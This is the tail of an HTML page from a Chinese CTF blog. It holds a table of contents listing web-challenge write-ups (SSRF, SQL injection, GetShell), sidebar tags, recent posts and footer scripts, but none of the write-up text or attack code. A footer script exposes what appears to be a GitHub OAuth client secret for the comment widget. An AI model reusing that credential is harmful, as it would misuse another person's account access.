        gitalk.render('comment-container')});</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1 is-sticky"><div class="card widget toc-scroll" id="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list toc"><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-HITCON-2017-SSRFme" href="#HITCON-2017-SSRFme"><span>[HITCON 2017]SSRFme</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-åˆ©ç”¨perlçš„openå‘½ä»¤è¿›è¡ŒSSRF" href="#åˆ©ç”¨perlçš„openå‘½ä»¤è¿›è¡ŒSSRF"><span>åˆ©ç”¨perlçš„openå‘½ä»¤è¿›è¡ŒSSRF</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-RoarCTF-2019-Online-Proxy" href="#RoarCTF-2019-Online-Proxy"><span>[RoarCTF 2019]Online Proxy</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-è§£é¢˜" href="#è§£é¢˜"><span>è§£é¢˜</span></a></li></ul></li></ul><li><a class="is-flex toc-item" id="toc-item-Black-Watch-å…¥ç¾¤é¢˜-Web" href="#Black-Watch-å…¥ç¾¤é¢˜-Web"><span>[Black Watch å…¥ç¾¤é¢˜]Web</span></a><ul class="menu-list toc"><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-é¢˜ç›®åˆ†æ-1" href="#é¢˜ç›®åˆ†æ-1"><span>é¢˜ç›®åˆ†æ</span></a></li><li><a class="is-flex toc-item" id="toc-item-è§£é¢˜è„šæœ¬" href="#è§£é¢˜è„šæœ¬"><span>è§£é¢˜è„šæœ¬</span></a></li></ul><li><a class="is-flex toc-item" id="toc-item-HarekazeCTF2019-encode-and-encode" href="#HarekazeCTF2019-encode-and-encode"><span>[HarekazeCTF2019]encode_and_encode</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-é¢˜ç›®åˆ†æ-2" href="#é¢˜ç›®åˆ†æ-2"><span>é¢˜ç›®åˆ†æ</span></a></li><li><a class="is-flex toc-item" id="toc-item-è§£é¢˜-1" href="#è§£é¢˜-1"><span>è§£é¢˜</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-CISCN-2019-Easyweb" href="#CISCN-2019-Easyweb"><span>[CISCN 2019]Easyweb</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-é¢˜ç›®åˆ†æ-3" href="#é¢˜ç›®åˆ†æ-3"><span>é¢˜ç›®åˆ†æ</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-GXYCTF2019-BabySQli" href="#GXYCTF2019-BabySQli"><span>[GXYCTF2019]BabySQli</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-é¢˜ç›®åˆ†æ-4" href="#é¢˜ç›®åˆ†æ-4"><span>é¢˜ç›®åˆ†æ</span></a></li><li><a class="is-flex toc-item" id="toc-item-è§£é¢˜-2" href="#è§£é¢˜-2"><span>è§£é¢˜</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-SUCTF-2018-GetShell" href="#SUCTF-2018-GetShell"><span>[SUCTF 2018]GetShell</span></a></li></ul></li></ul></div></div><script type="text/javascript" async>
        $(document).ready(function () { //å‚è€ƒè‡ª https://github.com/ppoffice/hexo-theme-icarus/pull/616/files
            var observerTopMargin;
            var scrollObserver;
            var headerElems = $(".headerlink");
            var activeTocItem;
        
            function initIntersectionObserver(docHeight) {
                observerTopMargin = docHeight;
                scrollObserver = new IntersectionObserver(scrollCallBack,
                    {
                        root: null,  // viewpoint
                        rootMargin: docHeight + "px 0px -80% 0px"  // cover top 30% of viewport to the top of document
                    })
            }
        
            function scrollCallBack(entries, observer) {
                if ($(window).scrollTop() > observerTopMargin * 0.7) { 
                    // User somehow scroll to 70% of observerTopMargin (which is inited as 200% document height)
                    // Observer top margin need to extend to cover all the space to the top of the document
                    initIntersectionObserver(observerTopMargin * 2)
                    observer.disconnect();
                    return;
                }
                let toActive;
                if (entries[0].intersectionRatio == 1) {  // enter viewed area
                    let entry = entries.reduce((u, v) => (u.target.toc_id > v.target.toc_id ? u : v));  // get the lowest item
                    toActive = $("#toc-item-" + $(entry.target).attr("href").substr(1));
                } else {
                    let entry = entries.reduce((u, v) => (u.target.toc_id < v.target.toc_id ? u : v));  // get the highest item
                    let idx = Math.max(entry.target.toc_id - 1, 0);
                    toActive = $("#toc-item-" + $(headerElems[idx]).attr("href").substr(1));
                }
                if (activeTocItem) activeTocItem.removeClass("is-current");
                activeTocItem = toActive
                activeTocItem.addClass("is-current");
            }
        
            initIntersectionObserver($(document).height() * 2);
            headerElems.each(function (index, obj) {
                obj.toc_id = index;
                scrollObserver.observe(obj);
            })
        });</script></div><div class="card widget"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="is-rounded" src="http://ggb0n.cool/images/header.jpg" alt="ggb0n"></figure><p class="title is-size-4 is-block line-height-inherit">ggb0n</p><p class="is-size-6 is-block">ä¸€ç”Ÿä¸€ä¸–ï¼Œçˆ±ä½ ä¸€äººã€‚ğŸ’Œ</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>ä¼Ÿå¤§çš„ä¸­å›½</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">29</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">11</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">104</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ggb0n" target="_blank" rel="noopener">Follow</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/ggb0n"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="Weibo" href="https://weibo.com/u/5955623314"><i class="fab fa-weibo"></i></a><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="Email" href="mailto:gg.b0n@qq.com"><i class="fa fa-envelope"></i></a><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="Next" href="https://15h3na0.xyz"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div><div><hr><p id="hitokoto">:D ä¸€è¨€å¥å­è·å–ä¸­...</p><script type="text/javascript" defer>function getYiyan(){
                                $.getJSON("https://v1.hitokoto.cn/", function (data) {
                                if(data){
                                    $('#hitokoto').html("");
                                    $('#hitokoto').append("<strong style='color: #3273dc;'>"+data.hitokoto+"</strong>"+
                                    "<p>"+"æ¥æºã€Š"+data.from+"ã€‹</p><p>æä¾›è€…-"+data.creator+"</p>");
                                }});}
                                $(function (){getYiyan();$('#hitokoto').click(function(){getYiyan();})});</script></div></div></div><div class="card widget"><div class="card-content"><h3 class="menu-label">Latest Comment</h3><span class="body_hot_comment">Loading...Wait a Minute!</span></div></div><div class="card widget"><div class="card-content"><h3 class="menu-label">Recent</h3><article class="media"><a class="media-left" href="/2020/05/02/De1CTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"><p class="image is-64x64"><img class="thumbnail" src="http://ggb0n.cool/images/de1ctf-top.png" alt="De1CTF2020éƒ¨åˆ†é¢˜è§£"></p></a><div class="media-content size-small"><p><time dateTime="2020-05-02T02:07:36.000Z">2020-05-02</time></p><p class="title is-6"><a class="link-muted" href="/2020/05/02/De1CTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">De1CTF2020éƒ¨åˆ†é¢˜è§£</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey">Â </i><a class="link-muted" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">CTFå­¦ä¹ è®°å½•</a> / <a class="link-muted" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/">æ¯”èµ›åˆ’æ°´</a></p></div></article><article class="media"><a class="media-left" href="/2020/05/01/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"><p class="image is-64x64"><img class="thumbnail" src="http://ggb0n.cool/images/gpu-top.jpg" alt="æ·±åº¦å­¦ä¹ ç¯å¢ƒé…ç½®"></p></a><div class="media-content size-small"><p><time dateTime="2020-05-01T15:23:59.000Z">2020-05-01</time></p><p class="title is-6"><a class="link-muted" href="/2020/05/01/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">æ·±åº¦å­¦ä¹ ç¯å¢ƒé…ç½®</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey">Â </i><a class="link-muted" href="/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/">æœºå™¨å­¦ä¹ </a></p></div></article><article class="media"><a class="media-left" href="/2020/04/25/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9BDSACTF/"><p class="image is-64x64"><img class="thumbnail" src="http://ggb0n.cool/images/dasctf-top.png" alt="å®‰æ’æœˆèµ›DASCTF"></p></a><div class="media-content size-small"><p><time dateTime="2020-04-25T07:07:29.000Z">2020-04-25</time></p><p class="title is-6"><a class="link-muted" href="/2020/04/25/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9BDSACTF/">å®‰æ’æœˆèµ›DASCTF</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey">Â </i><a class="link-muted" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">CTFå­¦ä¹ è®°å½•</a> / <a class="link-muted" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/">æ¯”èµ›åˆ’æ°´</a></p></div></article><article class="media"><a class="media-left" href="/2020/04/21/%E8%99%8E%E7%AC%A6CTF%E5%A4%8D%E7%8E%B0/"><p class="image is-64x64"><img class="thumbnail" src="http://ggb0n.cool/images/hfctf-top.png" alt="è™ç¬¦CTFä¸¤é“webå­¦ä¹ JS"></p></a><div class="media-content size-small"><p><time dateTime="2020-04-21T11:50:00.000Z">2020-04-21</time></p><p class="title is-6"><a class="link-muted" href="/2020/04/21/%E8%99%8E%E7%AC%A6CTF%E5%A4%8D%E7%8E%B0/">è™ç¬¦CTFä¸¤é“webå­¦ä¹ JS</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey">Â </i><a class="link-muted" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">CTFå­¦ä¹ è®°å½•</a> / <a class="link-muted" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/">èµ›é¢˜å¤ç°</a></p></div></article><article class="media"><a class="media-left" href="/2020/04/16/obfs4%E7%BD%91%E6%A1%A5%E9%97%AE%E9%A2%98%E7%9A%84%E5%A4%84%E7%90%86/"><p class="image is-64x64"><img class="thumbnail" src="http://ggb0n.cool/images/wangqiao-top1.jpg" alt="obfs4ç½‘æ¡¥é—®é¢˜çš„å¤„ç†"></p></a><div class="media-content size-small"><p><time dateTime="2020-04-16T01:52:29.000Z">2020-04-16</time></p><p class="title is-6"><a class="link-muted" href="/2020/04/16/obfs4%E7%BD%91%E6%A1%A5%E9%97%AE%E9%A2%98%E7%9A%84%E5%A4%84%E7%90%86/">obfs4ç½‘æ¡¥é—®é¢˜çš„å¤„ç†</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey">Â </i><a class="link-muted" href="/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/">çæ‰æ‘¸çš„ä¸€äº›å­¦ä¹ </a> / <a class="link-muted" href="/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/obfs4%E7%BD%91%E6%A1%A5%E6%90%AD%E5%BB%BA/">obfs4ç½‘æ¡¥æ­å»º</a></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"><span class="level-start"><span class="level-item">CTFå­¦ä¹ è®°å½•</span></span><span class="level-end"><span class="level-item tag">21</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/BUU%E5%88%B7%E9%A2%98/"><span class="level-start"><span class="level-item">BUUåˆ·é¢˜</span></span><span class="level-end"><span class="level-item tag">5</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/BUU%E5%88%B7%E9%A2%98/SQL%E6%B3%A8%E5%85%A5/"><span class="level-start"><span class="level-item">SQLæ³¨å…¥</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/CTFHub%E5%88%B7%E9%A2%98/"><span class="level-start"><span class="level-item">CTFHubåˆ·é¢˜</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/"><span class="level-start"><span class="level-item">æ¯”èµ›åˆ’æ°´</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"><span class="level-start"><span class="level-item">èµ›é¢˜å¤ç°</span></span><span class="level-end"><span class="level-item tag">8</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"><span class="level-start"><span class="level-item">æœºå™¨å­¦ä¹ </span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/"><span class="level-start"><span class="level-item">çæ‰æ‘¸çš„ä¸€äº›å­¦ä¹ </span></span><span class="level-end"><span class="level-item tag">4</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/FTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/"><span class="level-start"><span class="level-item">FTPæœåŠ¡å™¨æ­å»º</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/obfs4%E7%BD%91%E6%A1%A5%E6%90%AD%E5%BB%BA/"><span class="level-start"><span class="level-item">obfs4ç½‘æ¡¥æ­å»º</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></li><a class="level is-mobile is-marginless" href="/categories/"><span class="level-start"><span class="level-item">æŸ¥çœ‹å…¨éƒ¨&gt;&gt;</span></span></a></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2020/05/"><span class="level-start"><span class="level-item">May 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/04/"><span class="level-start"><span class="level-item">April 2020</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/03/"><span class="level-start"><span class="level-item">March 2020</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/02/"><span class="level-start"><span class="level-item">February 2020</span></span><span class="level-end"><span class="level-item tag">13</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag is-grey-lightest">17</span></a></div><div class="control"><a class="tags has-addons" href="/tags/web/"><span class="tag">web</span><span class="tag is-grey-lightest">16</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SQL%E6%B3%A8%E5%85%A5/"><span class="tag">SQLæ³¨å…¥</span><span class="tag is-grey-lightest">10</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Cookie%E6%94%BB%E5%87%BB/"><span class="tag">Cookieæ”»å‡»</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/JWT%E4%BC%AA%E9%80%A0/"><span class="tag">JWTä¼ªé€ </span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/bypass-functions-disable/"><span class="tag">bypass functions_disable</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"><span class="tag">ååºåˆ—åŒ–æ¼æ´</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><span class="tag">æ–‡ä»¶ä¸Šä¼ </span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/RSA%E6%94%BB%E5%87%BB/"><span class="tag">RSAæ”»å‡»</span><span class="tag is-grey-lightest">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"><span class="tag">å¸ƒå°”ç›²æ³¨</span><span class="tag is-grey-lightest">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linux/"><span class="tag">Linux</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/RCE/"><span class="tag">RCE</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SSRF/"><span class="tag">SSRF</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SSTI/"><span class="tag">SSTI</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/crypto/"><span class="tag">crypto</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"><span class="tag">äºŒæ¬¡æ³¨å…¥</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E/"><span class="tag">ååºåˆ—åŒ–é€ƒé€¸æ¼æ´</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"><span class="tag">æŠ¥é”™æ³¨å…¥</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/JavaScript/"><span class="tag">JavaScript</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Machine-Learning/"><span class="tag">Machine Learning</span><span class="tag is-grey-lightest">2</span></a></div></div><div class="field is-grouped is-grouped-multiline"><a class="tags has-addons" href="/tags/"><span class="tag">æŸ¥çœ‹å…¨éƒ¨&gt;&gt;</span></a></div></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Subscribe to Updates</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=ggb0nsBlog&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="ggb0nsBlog" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button is-primary" type="submit" value="Subscribe"></div></div><p class="help">è¾“å…¥é‚®ç®±è®¢é˜…æœ¬åšå®¢ï¼Œæ›´åšåé‚®ä»¶é€šçŸ¥å¸ˆå‚…ï¼ğŸ‘¾</p></form></div></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo1.png" alt="ggb0n&#039;s Blog" height="28"></a><p class="size-small"><span>&copy; 2020 ggb0n</span>Â Â Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>,Modify by <a href="https://github.com/removeif/hexo-theme-amazing" target="_blank">removeif</a>Â <br><span>Â© <a href="http://www.beian.miit.gov.cn/" target="_blank">è±«ICPå¤‡20003023å·</a><br></span><span>Â© ç‰ˆæƒè¯´æ˜ï¼š[æœ¬åšå®¢æ‰€æœ‰å†…å®¹å‡å­¦ä¹ äºäº’è”ç½‘æˆ–è‡ªå·±åŸåˆ›,<br />&nbsp;&nbsp;&nbsp;&nbsp;æ–¹ä¾¿å­¦ä¹ äº¤æµï¼Œå¦‚æœ‰ä¾µæƒï¼Œè¯·<a href="/message" target="_blank">ç•™è¨€</a>ï¼Œç«‹å³å¤„ç†ã€‚]<br /></span><span><span id="statistic-times">loading...</span><script>function createTime(time) {
            var n = new Date(time);
            now.setTime(now.getTime() + 250),
                days = (now - n) / 1e3 / 60 / 60 / 24,
                dnum = Math.floor(days),
                hours = (now - n) / 1e3 / 60 / 60 - 24 * dnum,
                hnum = Math.floor(hours),
            1 == String(hnum).length && (hnum = "0" + hnum),
                minutes = (now - n) / 1e3 / 60 - 1440 * dnum - 60 * hnum,
                mnum = Math.floor(minutes),
            1 == String(mnum).length && (mnum = "0" + mnum),
                seconds = (now - n) / 1e3 - 86400 * dnum - 3600 * hnum - 60 * mnum,
                snum = Math.round(seconds),
            1 == String(snum).length && (snum = "0" + snum),
                document.getElementById("statistic-times").innerHTML = "â¤ï¸Site from <strong>"+time.split(" ")[0].replace(/\//g,".")+"</strong> has existed <strong>" + dnum + "</strong> d <strong>" + hnum + "</strong> h <strong>" + mnum + "</strong> m <strong>" + snum + "</strong> sï¼â¤ï¸";
        }var now = new Date();setInterval("createTime('2020/02/02 00:00:00')", 250,"");</script><br></span><div class="size-small"><span>â¤ï¸thx <strong><span id="busuanzi_value_site_uv">99+</span></strong> users <strong><span id="busuanzi_value_site_pv">99+</span></strong> visitedï¼â¤ï¸</span></div></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ggb0n"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            site: {
                url: 'http://ggb0n.cool',
                external_link: {"enable":true,"exclude":[]}
            },
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" defer></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to Top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back-to-top.js" defer></script><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.12/js/lightgallery-all.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js" defer></script><!--!--><!--!--><!--!--><script src="/js/toc.js" defer></script><script src="/js/main.js" defer></script><script>$.getScript('/js/comment-issue-data.js',function(){loadIssueData('0a75c84e24da4e774d10','80c72733da730b019e5047ae6c7eff937914a4d9','ggb0n','blog_comment',false);})</script><link rel="stylesheet" href="/css/insight.css"><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Type something..."><span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"></div></div></div></div><script>(function (window) {
            var INSIGHT_CONFIG = {
                TRANSLATION: {
                    POSTS: 'Posts',
                    PAGES: 'Pages',
                    CATEGORIES: 'Categories',
                    TAGS: 'Tags',
                    UNTITLED: '(Untitled)',
                },
                CONTENT_URL: '/content.json',
            };
            window.INSIGHT_CONFIG = INSIGHT_CONFIG;
        })(window);</script><script src="/js/insight.js" defer></script></body></html>